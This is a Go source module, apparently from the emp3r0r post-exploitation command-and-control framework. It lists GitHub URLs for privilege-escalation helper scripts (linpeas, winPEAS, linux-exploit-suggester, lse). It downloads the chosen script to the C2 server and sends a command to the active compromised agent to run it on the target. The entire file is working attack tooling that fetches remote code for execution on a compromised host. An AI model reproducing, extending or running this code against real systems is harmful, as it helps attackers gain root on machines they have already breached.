package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/tools"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// LPEHelperURLs scripts that help you get root
var LPEHelperURLs = map[string]string{
	"lpe_les":         "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
	"lpe_lse":         "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	"lpe_linpeas":     "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	"lpe_winpeas.ps1": "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1",
	"lpe_winpeas.bat": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	"lpe_winpeas.exe": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
}

func moduleLPE() {
	go func() {
		// target
		target := def.ActiveAgent
		if target == nil {
			logging.Errorf("Target not exist")
			return
		}
		helperOpt, ok := def.AvailableModuleOptions["lpe_helper"]
		if !ok {
			logging.Errorf("Option 'lpe_helper' not found")
			return
		}
		helperName := helperOpt.Val

		// download third-party LPE helper
		logging.Infof("Updating local LPE helper...")
		err := tools.DownloadFile(LPEHelperURLs[helperName], def.Temp+tun.WWW+helperName)
		if err != nil {
			logging.Errorf("Failed to download %s: %v", helperName, err)
			return
		}

		// exec
		logging.Printf("This can take some time, please be patient")
		cmd := fmt.Sprintf("%s --script_name %s", emp3r0r_def.C2CmdLPE, helperName)
		logging.Infof("Running %s", cmd)
		err = agents.SendCmd(cmd, "", target)
		if err != nil {
			logging.Errorf("Run %s: %v", cmd, err)
		}
	}()
}
